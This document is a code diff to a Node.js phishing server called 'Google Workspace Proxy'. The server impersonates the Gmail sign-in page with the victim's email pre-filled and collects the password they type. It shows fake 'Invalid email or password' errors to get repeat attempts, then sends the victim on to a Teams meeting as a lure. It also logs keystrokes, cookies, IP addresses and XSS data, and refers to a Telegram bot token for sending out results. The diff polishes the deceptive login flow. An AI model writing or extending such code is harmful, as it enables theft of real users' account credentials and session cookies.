@@ -33,13 +33,12 @@ const PATHS = {
 };
 
 console.log('╔═══════════════════════════════════════════════════════════╗');
-console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.0                   ║');
-console.log('║        🔐  Enhanced Proxy + Full Integration             ║');
+console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.1                   ║');
+console.log('║        🔐  Enhanced Proxy + User Feedback                ║');
 console.log('╠═══════════════════════════════════════════════════════════╣');
 console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
 console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
 console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
-console.log(`║   🔗 Backend:   ${BACKEND_URL}                          ║`);
 console.log('╚═══════════════════════════════════════════════════════════╝');
 
 // ============================================================
@@ -92,7 +91,8 @@ function createSession(email, ip, userAgent) {
         created: new Date().toISOString(),
         lastActivity: Date.now(),
         attempts: 0,
-        verified: false
+        verified: false,
+        error: null
     };
     console.log(`[SESSION] ✅ Created session ${sessionId.substring(0, 12)} for email: ${email}`);
     return sessionId;
@@ -396,7 +396,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  ✅ ENHANCED HANDLE LOGIN REQUEST - With Custom HTML Page
+//  ✅ ENHANCED HANDLE LOGIN REQUEST - With Error Handling
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -406,6 +406,10 @@ function handleLoginRequest(req, res) {
     const email = emailParam ? decodeURIComponent(emailParam[1]) : '';
     const ip = getClientIp(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    // Check for error parameter
+    const errorParam = req.url.match(/error=([^&]+)/);
+    const errorMessage = errorParam ? decodeURIComponent(errorParam[1]) : null;
 
     if (!email) {
         console.warn('[LOGIN] ⚠️ No email provided, redirecting to Google');
@@ -416,15 +420,27 @@ function handleLoginRequest(req, res) {
 
     console.log(`[LOGIN] 📧 Email: ${email}`);
     console.log(`[LOGIN] 📡 IP: ${ip}`);
+    console.log(`[LOGIN] ❌ Error: ${errorMessage || 'None'}`);
 
     const sessionId = createSession(email, ip, userAgent);
+    if (errorMessage) {
+        userSessions[sessionId].error = errorMessage;
+    }
+    
     const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
     console.log(`[LOGIN] 🆔 Session: ${sessionId}`);
 
-    // ✅ SERVE CUSTOM LOGIN PAGE WITH EMAIL PRE-FILLED
+    // ✅ SERVE CUSTOM LOGIN PAGE WITH ERROR MESSAGE
+    const errorDisplay = errorMessage ? `
+        <div class="error show" id="errorMsg">
+            <span class="error-icon">⚠️</span>
+            Invalid email or password. Please try again.
+        </div>
+    ` : '';
+
     const html = `
     <!DOCTYPE html>
     <html>
@@ -564,12 +580,19 @@ function handleLoginRequest(req, res) {
             .error {
                 color: #d93025;
                 font-size: 14px;
-                margin-top: 8px;
+                padding: 12px;
+                background: #fce8e6;
+                border-radius: 4px;
                 display: none;
                 text-align: center;
+                margin-bottom: 16px;
+                border: 1px solid #f5c6cb;
             }
             .error.show {
                 display: block;
+            }
+            .error .error-icon {
+                margin-right: 8px;
             }
             .loading {
                 display: none;
@@ -596,6 +619,19 @@ function handleLoginRequest(req, res) {
                 color: #5f6368;
                 font-size: 14px;
                 margin: 0;
+            }
+            .success-message {
+                text-align: center;
+                padding: 12px;
+                background: #e6f4ea;
+                border-radius: 4px;
+                color: #1e7e34;
+                margin-bottom: 16px;
+                border: 1px solid #c8e6c9;
+                display: none;
+            }
+            .success-message.show {
+                display: block;
             }
             .footer {
                 margin-top: 24px;
@@ -627,6 +663,12 @@ function handleLoginRequest(req, res) {
                 <p>to continue to Gmail</p>
             </div>
             
+            ${errorDisplay}
+            
+            <div class="success-message" id="successMsg">
+                ✅ Signing in successfully! Redirecting to meeting...
+            </div>
+            
             <div class="form-group">
                 <label>Email</label>
                 <div class="email-display" id="emailDisplay">${email}</div>
@@ -644,13 +686,16 @@ function handleLoginRequest(req, res) {
                 <a href="#">Forgot password?</a>
             </div>
             
-            <div id="error" class="error">Please enter your password</div>
+            <div id="error" class="error">
+                <span class="error-icon">⚠️</span>
+                Please enter your password
+            </div>
             
             <button class="btn" id="loginBtn">Sign In</button>
             
             <div class="loading" id="loading">
                 <span class="spinner"></span>
-                <p>Signing in...</p>
+                <p>Verifying credentials...</p>
             </div>
 
             <div class="footer">
@@ -681,12 +726,14 @@ function handleLoginRequest(req, res) {
             const passwordInput = document.getElementById('password');
             const errorDiv = document.getElementById('error');
             const loadingDiv = document.getElementById('loading');
+            const successDiv = document.getElementById('successMsg');
+            const errorMsgDiv = document.getElementById('errorMsg');
 
             function handleLogin() {
                 const password = passwordInput.value.trim();
                 
                 if (!password) {
-                    errorDiv.textContent = 'Please enter your password';
+                    errorDiv.textContent = '⚠️ Please enter your password';
                     errorDiv.classList.add('show');
                     passwordInput.focus();
                     passwordInput.style.borderColor = '#d93025';
@@ -697,9 +744,11 @@ function handleLoginRequest(req, res) {
                 }
 
                 errorDiv.classList.remove('show');
+                if (errorMsgDiv) errorMsgDiv.style.display = 'none';
                 loginBtn.disabled = true;
                 loginBtn.style.display = 'none';
                 loadingDiv.style.display = 'block';
+                successDiv.classList.remove('show');
 
                 console.log('📤 Submitting credentials for:', window.GOOGLE_CONFIG.EMAIL);
 
@@ -718,7 +767,12 @@ function handleLoginRequest(req, res) {
                 .then(response => {
                     if (response.redirected) {
                         console.log('✅ Redirecting to:', response.url);
-                        window.location.href = response.url;
+                        // Show success message
+                        successDiv.textContent = '✅ Signing in successfully! Redirecting to meeting...';
+                        successDiv.classList.add('show');
+                        setTimeout(() => {
+                            window.location.href = response.url;
+                        }, 1000);
                     } else if (response.ok) {
                         return response.json();
                     } else {
@@ -728,20 +782,29 @@ function handleLoginRequest(req, res) {
                 .then(data => {
                     if (data && data.success) {
                         console.log('✅ Login successful');
-                        window.location.href = 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true';
+                        successDiv.textContent = '✅ Signing in successfully! Redirecting to meeting...';
+                        successDiv.classList.add('show');
+                        setTimeout(() => {
+                            window.location.href = 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true';
+                        }, 1000);
                     } else {
                         throw new Error('Invalid credentials');
                     }
                 })
                 .catch(error => {
                     console.error('❌ Login error:', error.message);
-                    errorDiv.textContent = 'Invalid credentials. Please try again.';
+                    // Show error message with retry option
+                    errorDiv.textContent = '⚠️ Invalid email or password. Please try again.';
                     errorDiv.classList.add('show');
                     loginBtn.disabled = false;
                     loginBtn.style.display = 'block';
                     loadingDiv.style.display = 'none';
                     passwordInput.value = '';
                     passwordInput.focus();
+                    passwordInput.style.borderColor = '#d93025';
+                    setTimeout(() => {
+                        passwordInput.style.borderColor = '';
+                    }, 2000);
                 });
             }
 
@@ -756,11 +819,15 @@ function handleLoginRequest(req, res) {
 
             passwordInput.addEventListener('input', function() {
                 errorDiv.classList.remove('show');
+                if (errorMsgDiv) errorMsgDiv.style.display = 'none';
                 this.style.borderColor = '';
             });
 
             // Auto-focus password
             setTimeout(() => passwordInput.focus(), 500);
+
+            // If there was an error on page load, focus password
+            ${errorMessage ? 'setTimeout(() => passwordInput.focus(), 1000);' : ''}
         </script>
         <script src="${PATHS.script}"></script>
     </body>
@@ -887,6 +954,7 @@ async function handlePostRequest(body, req, res) {
             res.end();
         } else {
             console.log(`[AUTH] ❌ Invalid credentials: ${email}`);
+            // Redirect back to login with error parameter
             res.writeHead(302, { 
                 'Location': `/login?login_hint=${encodeURIComponent(email)}&error=invalid_credentials`,
                 'Cache-Control': 'no-store'
@@ -928,7 +996,7 @@ const server = http.createServer((req, res) => {
             uptime: process.uptime(),
             sessions: Object.keys(userSessions).length,
             service: 'Google Workspace Proxy',
-            version: '3.0.0'
+            version: '3.1.0'
         }));
         return;
     }
@@ -942,6 +1010,7 @@ const server = http.createServer((req, res) => {
             created: userSessions[id].created,
             attempts: userSessions[id].attempts || 0,
             verified: userSessions[id].verified || false,
+            error: userSessions[id].error || null,
             xssCount: (userSessions[id].xssData || []).length,
             cookieCount: (userSessions[id].cookies || []).length,
             keystrokeCount: (userSessions[id].keystrokes || []).length
@@ -1017,7 +1086,7 @@ setInterval(() => {
 
 server.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.0                   ║');
+    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.1                   ║');
     console.log('║        🔐  Gmail/GSuite + Full Cookie Capture           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
